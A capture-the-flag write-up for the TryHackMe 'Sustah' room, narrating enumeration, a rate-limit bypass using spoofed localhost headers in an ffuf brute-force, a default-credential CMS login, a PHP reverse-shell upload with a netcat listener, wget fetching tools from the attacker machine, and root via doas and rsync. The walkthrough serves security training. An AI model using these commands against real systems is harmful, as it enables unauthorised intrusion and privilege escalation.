## Writeup - Sustah Room - Try Hack Me

This is a writeup for the Sustah room on tryhackme.com - direct link: https://tryhackme.com/room/sustah

### Intro

The room is describes with: *The developers have added anti-cheat measures to their game. Are you able to defeat the restrictions to gain access to their internal CMS*

## Enumeration

First of all I always add the IP to my hosts file so I do not have to remember it. 
```
sudo echo "10.10.59.244  sustah.thm" >> /etc/hosts
```
As with most boxes we start with nmapping the hell ouf of it:

```
$ nmap -p- -sCV -T4  sustah.thm
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-24 13:31 EST
Nmap scan report for 10.10.59.244
Host is up (0.049s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 bd:a4:a3:ae:66:68:1d:74:e1:c0:6a:eb:2b:9b:f3:33 (RSA)
|   256 9a:db:73:79:0c:72:be:05:1a:86:73:dc:ac:6d:7a:ef (ECDSA)
|_  256 64:8d:5c:79:de:e1:f7:3f:08:7c:eb:b7:b3:24:64:1f (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Susta
8085/tcp open  http    Gunicorn 20.0.4
|_http-server-header: gunicorn/20.0.4
|_http-title: Spinner
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.39 seconds
```

So se see 3 ports open: 22 (ssh), 80 (http/apache) and 8085 (http/gunicorn).

Lets run a quick scan for folders with gobuster:
```
 gobuster dir -u http://10.10.59.244  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,txt,html,zip                                                                                                    1 ⨯
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.59.244
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     zip,php,txt,html
[+] Timeout:        10s
===============================================================
2021/01/24 15:11:59 Starting gobuster
===============================================================
/index.html (Status: 200)
/server-status (Status: 403)
===============================================================
2021/01/24 15:27:47 Finished
===============================================================

```

Not much on the apache server port 80. Lets try the other webserver on port 8085:
```
$ gobuster dir -u http://10.10.59.244:8085  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,txt,html,zip
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.59.244:8085
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt,html,zip
[+] Timeout:        10s
===============================================================
2021/01/24 15:31:39 Starting gobuster
===============================================================
/home (Status: 200)
/ping (Status: 200)
===============================================================
2021/01/24 16:16:18 Finished

```

Now this looks more interesting. Visiting the `/home/` folder shows some sort of "spin the wheel" game. Testing it shows that it if you input a number and pres the "click" button it seems like a form is posted with the number and it returns with a message that you weren't lucky.
![screenshot](https://github.com/kimusan/THM-writeups/raw/main/sustah/sustah-spin-wheel-ss.png "Screenshot of the spin the wheel game")
 

Pressing the "spin" button triggers some javascript function that spins the graphical wheel and starts a 10second countdown. Nothing seems to actualy happen towards the server. 

Going to the `/ping/` folder reveals a simple text page saying "PONG". It might be useful for something later as we need to get access to some internal CMS. 

Lets check the questions ahead. First question says: *What is the number that revealed the path?*.

To me this makes it likely that we need to find some number to input into the "spin the wheel" game input box. The "format" for the answer is ***** (5 digits) so it is likely that we need to find a number in the range 10000-99999. 

A quick way to generate a list of numbers is with the `seq`  command
```
$seq 10000 99999 > numbers.txt
```

Next we need to bruteforce this number. Normally this could be done with Burp Suite but when I tested this, it was mindblowing slow. It also showed that for every 10 or so numbers it told me to back off as I was sending too many requests. 

Ok, so we need  a way to send requests faster and at the same time make sure that we can get around the throtteling of the requests. 

Burp Suite contains a plugin for circumventing this request limitation by setting some http headers i the request. The description for this is here: https://portswigger.net/bappstore/ae2611da3bbc4687953a1f4ba6a4e04c

This identifies four http headers that could be set to point to localhost and thereby spoof the requests to look like they come from there and hence won't be limited.
The headers are: 

 * X-Originating-IP: 127.0.0.1 
 * X-Forwarded-For: 127.0.0.1
 * X-Remote-IP: 127.0.0.1
 * X-Remote-Addr: 127.0.0.1
 
Knowing that Burp Suite was slow for this I decided to go with my favorite fuzzer tool, *ffuf* insted as it can do all sorts of magic.

```
$ ffuf -w numbers.txt -X POST -d "number=FUZZ" -u http://sustah.thm:8085/home -H "Content-Type: application/x-www-form-urlencoded" -H "X-Originating-IP: 127.0.0.1" -H "Forwarded-For: 127.0.0.1" -H "X-REmote-IP: 127.0.0.1" -H "X-Remote-Addr: 127.0.0.1" -fw 157
```

So basically I tell it to do a POST request to the webserver on port 8085 folder /home/ with the argument "number=FUZZ" (FUZZ equals the number tested from the file numbers.txt). 
To make sure this is a form post, the header for that (Content-Type ...) needs to be set and then all the rest of the headers from the mentioned Burp plugin. 

The final part is a filter for the number of words. If you run without the filter you will see that every wrong answer comes back with exactly 157 words - hence we can filter those. 

With this in place it takes a matter of seconds before the right number pops up and we can answer question 1.  Inputting the number on the website shows that a new path /Y*******/ that we need to check - this also answers question 2. 

So testing this path on port 8085 webserver gives us an error - lets try it on port 80 instead: 

Wow we get a sample page of a CMS and with that we can answer question 3 + 4 (name and version of the CMS). 

Since this looks like a default sample page I thought that testing the default credentials would make sense. A quick websearch and it is revealed that the default user is *admin* and password is *changemenow* - bam we got access to the CMS. 

### Getting reverse shell

The CMS allows you do create a new page (it takes a bit of digging around at first) and the new page can be created by uploading a file - OK this is our way into the box - out foothold!

Upload my usual php reverse shell script, fire up `nc -lvnp 1234` on my local box and there is a nice reverse shell.  No take note of where it uploads the file - even if you request */* it will still put it in the */img/* folder.

going to http://sustah.thm/img/shell.php and the shell is ready for action in your local nc listener. 

### Enumeration and getting user
At this point  we have the www-data user, which is only god for enumerating the machine. I fired up a local webserver on my machine with `python3 -m http.server` and then used wget to get linpeas.sh 

The script did not  reveal much so I went back to the THM room page and noticed a Hint. It told me that there might be some useful backup files. 

People are simple so the files are likely to be named either something with backup or .bck or .bak

I opted for "backup" but realized that the find command was limited so I could not run it. Luckily I could easily start my local python webserver again and get the *find* binary from my atacker machine. 
```
wget <my ip>:8000/find
chmod +x find
./find / -name "*backup*" 2>/dev/null
```

It found a folder names /backups/ in a location that would not normally be used for backups. 
Checking the folder I see that only one file is readable (a hidden file) and did a quick `cat file`. It turns out it was the passwd file but with the users password in cleartext.

Using `su user` and the password I found and I got escalated to the real user account and the user.txt flag.

### Escalating priviledges

This time I did read the hint to beging with. It told me to look for an alternative to sudo. Being a long-time user of Linux and BSD made me thing of the `doas` command right away. 

Like with sudo there is a config file (usually /etc/doas.conf) that controls everything, but in this case it was not there. OK next best place for this is the user etc in /usr/local/etc/ and here it was.

The config file told me that I could run rsync command as root without a password, so going to https://gtfobins.github.io/gtfobins/rsync/#shell gave me a quick way to get a shell - this time as root. 

From here it is the usual `cat /root/root.txt` and the root flag and final answer needed for the room was found. 

### After thoughts

The Room was interesting as not many touch on the use of http headers during attack phase. This made this room a good room to learn from. After the actual foothold was in place, the rest was pretty simple. 

The thing delaying me the most was the fact that I did not read the hint for the userflag at first. I would eventually have found the backup files but it just took longer as I did all sorts of other enumerations of the box first. 

The priviledges escalation to root was, in my opinion too easy. 

Good room overall. 






